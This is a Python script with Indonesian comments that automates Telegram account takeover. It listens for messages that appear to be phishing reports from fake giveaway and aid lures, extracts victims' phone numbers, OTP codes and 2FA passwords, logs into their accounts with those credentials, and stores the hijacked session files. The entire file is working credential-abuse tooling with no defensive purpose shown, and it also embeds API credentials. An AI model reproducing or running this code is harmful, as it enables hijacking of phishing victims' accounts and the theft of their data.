import asyncio
import os
import re
from telethon import TelegramClient, events
import shutil

# Konfigurasi API
api_id = 26763615
api_hash = '4d8aa7c999f425c489422548d1db0bd7'

# Folder session
SESSIONS_FOLDER = "eww_sessions"
SESSIONS_TARGET = "sessions"
os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_TARGET, exist_ok=True)

# Buat client utama
client = TelegramClient("main2", api_id, api_hash)

# Daftar sementara login yang menunggu OTP
pending_login = {}

# Fungsi untuk memindahkan file session
def move_session(phone_number):
    src = os.path.join(SESSIONS_FOLDER, phone_number)
    dst = os.path.join(SESSIONS_TARGET, phone_number + ".session")
    if os.path.exists(src):
        shutil.move(src, dst)
        print(f"[✅] Session {phone_number} dipindahkan ke folder sessions/")
    else:
        print(f"[❌] Session {phone_number} tidak ditemukan di {src}")

# Handler pesan masuk
@client.on(events.NewMessage)
async def handler(event):
    msg = event.raw_text
    print(f"[📩] Pesan masuk: {msg[:40]}...")

    if any(x in msg for x in [
        '❮ LAPORAN DAFTAR GRATISKU ❯',
        '❮ LAPORAN UANG KUNO ❯',
        '❮ LAPORAN BANTUAN MADANI ❯',
        '❮ LAPORAN LAMBE PECINTA JANDA ❯',
        '❮ LAPORAN FAIDIL  ❯'
    ]):
        print("[🎯] Pesan cocok dengan filter final2.py")

        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', msg)
        otp_match = re.search(r'OTP\s*:\s*(\d{5,6})', msg)
        password_match = re.search(r'PASSWORD\s*:\s*(\S+)', msg)

        if phone_match:
            phone = phone_match.group(1)
            password = password_match.group(1) if password_match else None

            if otp_match:
                otp = otp_match.group(1)
                print(f"[🔐] OTP ditemukan untuk {phone}: {otp}")
                if phone in pending_login:
                    asyncio.create_task(complete_login(phone, otp, password))
                else:
                    print(f"[⚠️] OTP diterima tapi {phone} belum request login.")
            else:
                if phone not in pending_login:
                    print(f"[📞] Request OTP dikirim ke {phone}")
                    asyncio.create_task(request_otp(phone))
                else:
                    print(f"[⏳] Masih menunggu OTP untuk {phone}...")

# Fungsi request OTP
async def request_otp(phone):
    try:
        session_path = os.path.join(SESSIONS_FOLDER, phone)
        login_client = TelegramClient(session_path, api_id, api_hash)
        await login_client.connect()

        if not await login_client.is_user_authorized():
            await login_client.send_code_request(phone)
            pending_login[phone] = (login_client, None)
            print(f"[📨] Kode OTP dikirim ke {phone}")
        else:
            print(f"[✅] {phone} sudah login sebelumnya.")
            await login_client.disconnect()

    except Exception as e:
        print(f"[❌] Gagal mengirim OTP ke {phone}: {e}")

# Fungsi login dengan OTP
async def complete_login(phone, otp, password=None):
    try:
        login_data = pending_login.get(phone)
        if login_data:
            login_client, _ = login_data
            try:
                await login_client.sign_in(phone, otp)
            except Exception as e:
                if '2FA' in str(e) and password:
                    await login_client.sign_in(password=password)
                else:
                    print(f"[🔒] Gagal login tanpa password untuk {phone}: {e}")
                    return
            print(f"[✅] Login sukses untuk {phone}")
            move_session(phone)
            await login_client.disconnect()
            del pending_login[phone]
        else:
            print(f"[❌] Tidak ada login client untuk {phone}")
    except Exception as e:
        print(f"[❌] Gagal menyelesaikan login {phone}: {e}")

# Jalankan client
async def main():
    print("[🚀] Menjalankan final2.py ...")
    await client.start()
    print("[✅] Siap menerima pesan ...")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
